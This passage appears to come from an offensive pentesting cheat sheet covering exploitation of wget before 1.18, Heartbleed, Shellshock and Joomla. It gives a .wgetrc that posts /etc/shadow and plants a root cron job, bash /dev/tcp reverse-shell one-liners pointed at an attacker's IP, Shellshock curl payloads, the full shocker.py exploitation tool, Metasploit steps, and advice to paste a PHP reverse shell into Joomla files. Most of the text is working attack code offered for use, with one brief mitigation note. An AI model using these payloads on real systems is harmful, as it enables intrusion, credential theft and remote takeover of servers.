The exploit works when the \[wget] version is before \[1.18]. Steps of POC **Create a \[.wgetrc] config file on your machine and type in the below content**

```
post_file = /etc/shadow 
output_document = /etc/cron.d/wget-root-shell
```

**Create and host the config file with an FTP server using python**

```
python -m pyftpdlib -p21 -w
```

This will serve the config file we created \[.wgetrc] **Modify certain variables in the exploit code** HTTP\_LISTEN\_IP = \[ip address of the machine that is making the wget requests] HTTP\_LISTEN\_PORT = \[80] FTP\_HOST = \[your-machine-ip] FTP\_PORT = \[21] ROOT\_CRON = "\* \* \* \* \* root -c 'bash -i >& /dev/tcp/your-ip/listener-port 0>&1' \n" **Start a listener on your machine**

```
nc -lvp [port-used-in-exploit]
```

**Transfer the exploit to the target machine and run it** If you couldn't run the exploit because your user can't issue port bindings then use the below command

```
authbind python exploit.py
```

#### OpenSSL

**The Heartbleed vulnerability**

One of the old vulnerabilities but it still exists these days. It's a flaw in OpenSSL before 1.0.1 and 1.0.1h. It allows attackers to read data from memory that normally is supposed to be encrypted with SSL/TLS.

**Discovery**

**Using nmap**

```
nmap -sV -sC --script vuln -p 443
```

**Using sslyze**

```
sslyze --heartbleed [domain]
```

**Exploit**

Method \[1]

```
https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
```

Method \[2]

```
searchsploit -m exploits/multiple/remote/32745.py
```

Then

```bash
for i in $(seq 1 100000); do python 32764.py domain.com | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > dump$i; done
```

Method \[3]

```
https://github.com/sensepost/heartbleed-poc
```

#### The shellshock vulnerability

The shellshock vulnerability has been around for long time. Typically it's found in Apache web servers running \[cgi-bin] and SSH servers running \[openssh sshd]. This vulnerability allows for remote code execution simply by supplying the command in the request headers or by using an automated exploit script.

**Affected Bash versions**

Bash versions before \[4.3]

**POC**

**On Apache web servers**

Using curl, we can supply a simple command in the request headers

```
curl -H 'Cookie:() { :; }; ping -c 3 209.126.230.74' http://target/cgi-bin/example.sh
```

**Exploitation**

**Manually using curl**

```
curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/your-ip/your-port 0>&1' http://target/cgi-bin/example.sh
```

**Automated Exploits**

**With Exploit DB**

```
https://www.exploit-db.com/exploits/34900
```

and run as below

```
python 34900.py payload=reverse rhost=target-ip lhost=your-ip lport=your-port pages=/cgi-bin/example.sh
```

**With shocker.py**

Using this source \[https://raw.githubusercontent.com/nccgroup/shocker/master/shocker.py] or copy-paste the below code to \[shocker.py] script.

```python
#!/usr/bin/env python

"""
shocker.py v1.1
A tool to find and exploit webservers vulnerable to Shellshock

##############################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/        #
#                                                                            #
# Developed by Tom Watson, tom.watson@nccgroup.trust                         #
#                                                                            #
# https://www.github.com/nccgroup/shocker                                    #
#                                                                            #
# Released under the GNU Affero General Public License                       #
# (https://www.gnu.org/licenses/agpl-3.0.html)                               #
##############################################################################

Usage examples:
./shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
/etc/passwd

./shocker.py -H www.example.com -p 8001 -s
Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
attempts the default exploit for any found

./shocker.py -f iplist
Scans all hosts specified in the file ./iplist with default options

Read the README for more details
"""

import urllib2
import argparse
import string
import StringIO
import random
import signal
import sys
import socket
import Queue
import threading
import re
from collections import OrderedDict


# Wrapper object for sys.sdout to elimate buffering
# (https://stackoverflow.com/questions/107705/python-output-buffering)
class Unbuffered(object):
    def __init__(self, stream):
        self.stream = stream
    def write(self, data):
        self.stream.write(data)
        self.stream.flush()
    def __getattr__(self, attr):
        return getattr(self.stream, attr)

# Wrap std.out in Unbuffered
sys.stdout = Unbuffered(sys.stdout)


# User-agent to use instead of 'Python-urllib/2.6' or similar
user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"

# Handle CTRL-c elegently
def signal_handler(signal, frame):
    """ Try to catch and respond to CTRL-Cs
    """

    sys.exit(0)

# Timeout for urllib2.urlopen requests
TIMEOUT = 5

def check_hosts(host_target_list, port, verbose):
    """ Do some basic sanity checking on hosts to make sure they resolve
    and are currently reachable on the specified port(s)
    """
    
    counter = 0
    number_of_targets = len (host_target_list)
    confirmed_hosts = [] # List of resoveable and reachable hosts
    if number_of_targets > 1:
        print "[+] Checking connectivity to targets..."
    else:
        print "[+] Checking connectivity with target..."
    for host in host_target_list:
        counter += 1
        # Show a progress bar unless verbose or there is only 1 host 
        if not verbose and number_of_targets > 1: 
            print_progress(number_of_targets, counter) 

        try:
            if verbose: print "[I] Checking to see if %s resolves..." % host
            ipaddr = socket.gethostbyname(host)
            if verbose: print "[I] Resolved ok"
            if verbose: print "[I] Checking to see if %s is reachable on port %s..." % (host, port)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ipaddr, int(port)))
            s.close()
            if verbose: print "[I] %s seems reachable..." % host
            confirmed_hosts.append(host)
        except Exception as e:
            print "[!] Exception - %s: %s" % (host, e)
            print "[!] Omitting %s from target list..." % host
    if len(host_target_list) > 1:
        print "[+] %i of %i targets were reachable" % \
                            (len(confirmed_hosts), number_of_targets)
    elif len(confirmed_hosts) == 1:
        print "[+] Target was reachable"
    else:
        print "[+] Host unreachable"
    return confirmed_hosts


def scan_hosts(protocol, host_target_list, port, cgi_list, proxy, verbose):
    """ Go through each potential cgi in cgi_list spinning up a thread for each
    check. Create Request objects for each check. 
    """

    # List of potentially epxloitable URLs 
    exploit_targets = []
    cgi_num = len(cgi_list)
    q = Queue.Queue()
    threads = []
    
    for host in host_target_list:
        print "[+] Looking for vulnerabilities on %s:%s" % (host, port) 
        cgi_index = 0
        for cgi in cgi_list:
            cgi_index += 1

            # Show a progress bar unless verbose or there is only 1 cgi 
            if not verbose and cgi_num > 1: print_progress(cgi_num, cgi_index) 

            try:
                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
                url = req.get_full_url()
                if proxy:
                    req.set_proxy(proxy, "http")    
                
                # Pretend not to be Python for no particular reason
                req.add_header("User-Agent", user_agent)

                # Set the host header correctly (Python includes :port)
                req.add_header("Host", host)
                
                thread_pool.acquire()
                
                # Start a thread for each CGI in cgi_list
                if verbose: print "[I] Starting thread %i" % cgi_index
                t = threading.Thread(target = do_check_cgi, args = (req, q, verbose))
                t.start()
                threads.append(t)
            except Exception as e: 
                if verbose: print "[I] %s - %s" % (url, e) 
            finally:
                pass

        # Wait for all the threads to finish before moving on    
        for thread in threads:
            thread.join()
    
        # Pop any results from the Queue and add them to the list of potentially 
        # exploitable urls (exploit_targets) before returning that list
        while not q.empty():
            exploit_targets.append(q.get())
    
    if verbose: print "[+] Finished host scan"
    return exploit_targets

def do_check_cgi(req, q, verbose):
    """ Worker thread for scan_hosts to check if url is reachable
    """

    try:
        if urllib2.urlopen(req, None, TIMEOUT).getcode() == 200:
            q.put(req.get_full_url())
    except Exception as e:
        if verbose: print "[I] %s for %s" % (e, req.get_full_url()) 
    finally:
        thread_pool.release()

def do_exploit_cgi(proxy, target_list, command, verbose):
    """ For urls identified as potentially exploitable attempt to exploit
    """

    # Flag used to identify whether the exploit has successfully caused the
    # server to return a useful response
    success_flag = ''.join(
        random.choice(string.ascii_uppercase + string.digits
        ) for _ in range(20))
    
    # Dictionary {header:attack string} to try on discovered CGI scripts
    # Where attack string comprises exploit + success_flag + command
    attacks = {
       "Content-type": "() { :;}; echo; "
       }
    
    # A dictionary of apparently successfully exploited targets
    # {url: (header, exploit)}
    # Returned to main() 
    successful_targets = OrderedDict()

    if len(target_list) > 1:
        print "[+] %i potential targets found, attempting exploits" % len(target_list)
    else:
        print "[+] 1 potential target found, attempting exploits"
    for target in target_list:
        if verbose: print "[+] Trying exploit for %s" % target 
        if verbose: print "[I] Flag set to: %s" % success_flag
        for header, exploit in attacks.iteritems():
            attack = exploit + " echo " + success_flag + "; " + command
            result = do_attack(proxy, target, header, attack, verbose)
            if success_flag in result:
                if verbose: 
                    print "[!] %s looks vulnerable" % target 
                    print "[!] Response returned was:" 
                    buf = StringIO.StringIO(result)
                    if len(result) > (len(success_flag)):
                        for line in buf:
                            if line.strip() != success_flag: 
                                print "  %s" % line.strip()
                    else:
                        print "[!] A result was returned but was empty..."
                        print "[!] Maybe try a different exploit command?"
                    buf.close()
                successful_targets.update({target: (header, exploit)})
            else:
                if verbose: print "[-] Not vulnerable" 
    return successful_targets


def do_attack(proxy, target, header, attack, verbose):
    result = ""
    host = target.split(":")[1][2:] # substring host from target URL

    try:
        if verbose:
            print "[I] Header is: %s" % header
            print "[I] Attack string is: %s" % attack
        req = urllib2.Request(target)
        req.add_header(header, attack)
        if proxy:
            req.set_proxy(proxy, "http")    
            if verbose: print "[I] Proxy set to: %s" % str(proxy)
        req.add_header("User-Agent", user_agent)
        req.add_header("Host", host)
        resp = urllib2.urlopen(req, None, TIMEOUT)
        result =  resp.read()
    except Exception as e:
        if verbose: print "[I] %s - %s" % (target, e) 
    finally:
        pass
    return result

def ask_for_console(proxy, successful_targets, verbose):
    """ With any discovered vulnerable servers asks user if they
    would like to choose one of these to send further commands to
    in a semi interactive way
    successful_targets is a dictionary:
    {url: (header, exploit)}
    """

    # Initialise to non zero to enter while loop
    user_input = 1
    ordered_url_list = successful_targets.keys()
    
    while user_input is not 0:
        result = ""
        print "[+] The following URLs appear to be exploitable:"
        for x in range(len(ordered_url_list)):
            print "  [%i] %s" % (x+1, ordered_url_list[x])
        print "[+] Would you like to exploit further?"
        user_input = raw_input("[>] Enter an URL number or 0 to exit: ")
        sys.stdout.flush()
        try:
            user_input = int(user_input)
        except:
            continue
        if user_input not in range(len(successful_targets)+1):
            print "[-] Please enter a number between 1 and %i (0 to exit)" % \
                                                            len(successful_targets)
            continue
        elif not user_input:
            continue
        target = ordered_url_list[user_input-1]
        header = successful_targets[target][0]
        print "[+] Entering interactive mode for %s" % target
        print "[+] Enter commands (e.g. /bin/cat /etc/passwd) or 'quit'"

        while True:
            command = ""
            result = ""
            sys.stdout.flush()
            command = raw_input("  > ")
            sys.stdout.flush()
            if command == "quit":
                sys.stdout.flush()
                print "[+] Exiting interactive mode..."
                sys.stdout.flush()
                break
            if command:
                attack = successful_targets[target][1] + command
                result = do_attack(proxy, target, header, attack, verbose)
            else:
                result = ""
            if result: 
                buf = StringIO.StringIO(result)
                for line in buf:
                    sys.stdout.flush()
                    print "  < %s" % line.strip()
                    sys.stdout.flush()
            else:
                sys.stdout.flush()
                print "  > No response"
                sys.stdout.flush()


def validate_address(hostaddress, debug):
    """ Attempt to identify if proposed host address is invalid by matching
    against some very rough regexes """

    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
    FQDN_pattern = re.compile('^(\w+\.)*\w+$')
    if debug: print "[D] Evaluating host '%s'" % hostaddress
    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
        return True 
    else:
        print "Host %s appears invalid, exiting..." % hostaddress
        exit(0)


def get_targets_from_file(file_name, debug):
    """ Import targets to scan from file
    """

    host_target_list = []
    with open(file_name, 'r') as f:
        for line in f:
            line = line.strip()
            if not line.startswith('#') and validate_address(line, debug):
                host_target_list.append(line)
    print "[+] %i hosts imported from %s" % (len(host_target_list), file_name)
    return host_target_list


def import_cgi_list_from_file(file_name):
    """ Import CGIs to scan from file
    """

    cgi_list = []
    with open(file_name, 'r') as f:
        for line in f:
            if not line.startswith('#'):
                cgi_list.append(line.strip())
    print "[+] %i potential targets imported from %s" % (len(cgi_list), file_name)
    return cgi_list


def print_progress(
                total,
                count,
                lbracket = "[",
                rbracket = "]",
                completed = ">",
                incomplete = "-",
                bar_size  = 50
                ): 
    percentage_progress = (100.0/float(total))*float(count)
    bar = int(bar_size * percentage_progress/100)
    print lbracket + completed*bar + incomplete*(bar_size-bar) + rbracket + \
        " (" + str(count).rjust(len(str(total)), " ") + "/" + str(total) + ")\r",
    if percentage_progress == 100: print "\n"


def main():
    print """
   .-. .            .            
  (   )|            |            
   `-. |--. .-.  .-.|.-. .-. .--.
  (   )|  |(   )(   |-.'(.-' |   
   `-' '  `-`-'  `-''  `-`--''  v1.1 
   
 Tom Watson, tom.watson@nccgroup.trust
 https://www.github.com/nccgroup/shocker
     
 Released under the GNU Affero General Public License
 (https://www.gnu.org/licenses/agpl-3.0.html)
    
    """ 
    
    # Handle CTRL-c elegently
    signal.signal(signal.SIGINT, signal_handler)

    # Handle command line argumemts
    parser = argparse.ArgumentParser(
        description='A Shellshock scanner and exploitation tool',
        epilog='Examples of use can be found in the README' 
        )
    targets = parser.add_mutually_exclusive_group(required=True)
    targets.add_argument(
        '--Host',
        '-H',
        type = str,
        help = 'A target hostname or IP address'
        )
    targets.add_argument(
        '--file',
	'-f',
        type = str,
        help = 'File containing a list of targets'
        )
    cgis = parser.add_mutually_exclusive_group()
    cgis.add_argument(
        '--cgilist',
        type = str,
        default = './shocker-cgi_list',
        help = 'File containing a list of CGIs to try'
        )
    cgis.add_argument(
        '--cgi',
        '-c',
        type = str,
        help = "Single CGI to check (e.g. /cgi-bin/test.cgi)"
        )
    parser.add_argument(
        '--port',
        '-p',
        default = 80,
        type = int, 
        help = 'The target port number (default=80)'
        )
    parser.add_argument(
        '--command',
        default = "/bin/uname -a",
        help = "Command to execute (default=/bin/uname -a)"
        )
    parser.add_argument(
        '--proxy', 
        help = "*A BIT BROKEN RIGHT NOW* Proxy to be used in the form 'ip:port'"
        )
    parser.add_argument(
        '--ssl',
        '-s',
        action = "store_true", 
        default = False,
        help = "Use SSL (default=False)"
        )
    parser.add_argument(
        '--threads',
        '-t',
        type = int,
        default = 10,
        help = "Maximum number of threads (default=10, max=100)"
        )
    parser.add_argument(
        '--verbose',
        '-v',
        action = "store_true", 
        default = False,
        help = "Be verbose in output"
        )
    parser.add_argument(
        '--debug',
        '-d',
        action = "store_true",
        default = False,
        help = "Output debugging information during execution"
        )
    args = parser.parse_args()

    # Assign options to variables
    debug = args.debug
    if args.Host:
        host_target_list = [args.Host]
    else:
        host_target_list = get_targets_from_file(args.file, debug)
    if not len(host_target_list) > 0:
        print "[-] No valid targets provided, exiting..."
        exit (0)
    port = str(args.port)
    if args.proxy is not None:
        proxy = args.proxy
    else:
        proxy = ""
    verbose = args.verbose
    command = args.command
    if args.ssl == True or port == "443":
        protocol = "https"
    else:
        protocol = "http"
    global thread_pool
    if args.threads > 100:
        print "Maximum number of threads is 100"
        exit(0) 
    else:
        thread_pool = threading.BoundedSemaphore(args.threads)
    if args.cgi is not None:
        cgi_list = [args.cgi]
        print "[+] Single target '%s' being used" % cgi_list[0]
    else:
        cgi_list = import_cgi_list_from_file(args.cgilist)

    # Check hosts resolve and are reachable on the chosen port
    confirmed_hosts = check_hosts(host_target_list, port, verbose)

    # Go through the cgi_list looking for any present on the target host
    target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)

    # If any cgi scripts were found on the target host try to exploit them
    if len(target_list):
        successful_targets = do_exploit_cgi(proxy, target_list, command, verbose)
        if len(successful_targets):
            ask_for_console(proxy, successful_targets, verbose)
        else:
            print "[-] All exploit attempts failed"
    else:
        print "[+] No targets found to exploit"

__version__ = '1.1'
if __name__ == '__main__':
    main()
```

Then run the script as below

```
python2 shocker.py -H targer-ip --command "/bin/bash -i > /dev/tcp/your-ip/your-port 0<&1 2>&1" -c /cgi-bin/user.sh --verbose
```

**With Metasploit**

```
msf > search ShellShock msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec 
msf exploit(exploit/multi/http/apache_mod_cgi_bash_env_exec) > show options 
msf exploit(exploit/multi/http/apache_mod_cgi_bash_env_exec) > set RHOST [target-ip]
msf exploit(exploit/multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/example.sh
msf exploit(exploit/multi/http/apache_mod_cgi_bash_env_exec) > check
```

**Mitigation**

```
Upgrade to bash beyond 4.3
Disable shell callouts in /cgi-bin
Leave /cgi-bin empty and secure its write permissions
```

### Joomla

#### Definition

Joomla is a content management system used to create and manage web blogs Official URL

```
https://www.joomla.org/
```

#### CVE-2017-8917

**Impact** Attackers will be able to dump user credentials from the database. **Exploitation**

* Use the below python script

```
github.com/XiphosResearch/exploits/tree/master/Joomblah
```

* Execute the python script

```
python joomblah.py http://127.0.0.1:8080
```

#### Reverse Shell Without Vulnerability Exploitation

If you got authenticated admin access to Joomla dashboard and found that its current version not to be vulnerable, you can then edit any `.php` file whether theme files or Joomla installation files and paste any `php reverse shell` to establish a foothold.
